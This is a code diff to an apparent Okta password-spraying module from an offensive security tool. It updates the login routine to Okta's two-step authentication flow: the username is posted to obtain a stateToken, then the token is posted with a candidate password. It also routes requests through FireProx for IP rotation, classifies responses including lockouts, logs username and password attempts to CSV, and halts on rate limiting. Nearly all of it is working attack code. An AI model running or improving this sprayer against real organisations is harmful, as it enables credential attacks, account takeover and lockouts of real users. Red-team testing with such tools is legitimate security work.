@@ -4,14 +4,18 @@ import json
 import requests
 
 
-# Adapted from: https://github.com/Rhynorater/Okta-Password-Sprayer/blob/master/oSpray.py
 class Okta:
     def __init__(self, host, port, timeout, fireprox):
         self.timeout = timeout
         self.url = f"https://{host}:{port}/api/v1/authn"
 
+        # Okta requires username posted to /api/v1/authn to get a stateToken, and then this
+        # token and password get posted to /api/v1/authn/factors/password/verify
+        self.url2 = f"https://{host}:{port}/api/v1/authn/factors/password/verify"
+
         if fireprox:
             self.url = f"https://{fireprox}/fireprox/api/v1/authn"
+            self.url2 = f"https://{fireprox}/fireprox/api/v1/authn/factors/password/verify"
 
         self.headers = {
             "Accept": "application/json",
@@ -23,29 +27,57 @@ class Okta:
             "Content-Type": "application/json",
         }
 
+        # username submission json
         self.data = {
             "username": "",
             "options": {
                 "warnBeforePasswordExpired": "true",
                 "multiOptionalFactorEnroll": "true",
-            },
+            }
+        }
+
+        # password submission json
+        self.data2 = {
             "password": "",
+            "stateToken": ""
         }
 
     def set_username(self, username):
         self.data["username"] = username
 
     def set_password(self, password):
-        self.data["password"] = password
+        self.data2["password"] = password
+
+    def set_token(self, token):
+        self.data2["stateToken"] = token
 
     def login(self, username, password):
         # set data
         self.set_username(username)
-        self.set_password(password)
         # post the request
         response = requests.post(
             self.url, headers=self.headers, json=self.data, timeout=self.timeout
         )  # , verify=False, proxies=self.proxyDict)
+        
+        # get the stateToken for password submission
+        data = response.json()
+        token = ""
+        if 'stateToken' in data.keys():
+            token = data["stateToken"]
+        else:
+            # temp debug
+            # print("[DEBUG] stateToken missing from Okta response;")
+            # raise ValueError(f"Okta response missing stateToken")
+            return response
+
+
+        self.set_password(password)
+        self.set_token(token)
+        # post the request
+        response = requests.post(
+            self.url2, headers=self.headers, json=self.data2, timeout=self.timeout
+        )  # , verify=False, proxies=self.proxyDict)
+        
         return response
 
     # handle CSV out output headers. Can be customized per module
@@ -89,13 +121,20 @@ class Okta:
 
         data = response.json()
 
+        result = None
+
         if "errorSummary" in data.keys():
-            # standard fail
             if data["errorSummary"] == "Authentication failed":
+                # Login returned early - stateToken missing               
+                result = "Error"
+                message = "Okta resp missing stateToken"
+            else:
+                # standard fail
                 result = "Fail"
-                message = ""
+                message = data["errorSummary"]
 
         elif response.status_code == 200 and "status" in data.keys():
+            #print(f"[DEBUG]: {data}")
             # Account lockout
             if data["status"] == "LOCKED_OUT":
                 result = "Fail"
@@ -125,7 +164,7 @@ class Okta:
                 result,
                 message,
                 self.data["username"],
-                self.data["password"],
+                self.data2["password"],
                 code,
                 length,
             )
@@ -134,6 +173,10 @@ class Okta:
         # print to CSV file
         output = open(csvfile, "a")
         output.write(
-            f'{result},{message},{self.data["username"]},{self.data["password"]},{code},{length}\n'
+            f'{result},{message},{self.data["username"]},{self.data2["password"]},{code},{length}\n'
         )
         output.close()
+
+        if response.status_code == 429:
+            print("[!] Encountered HTTP response code 429; killing spray")
+            exit()
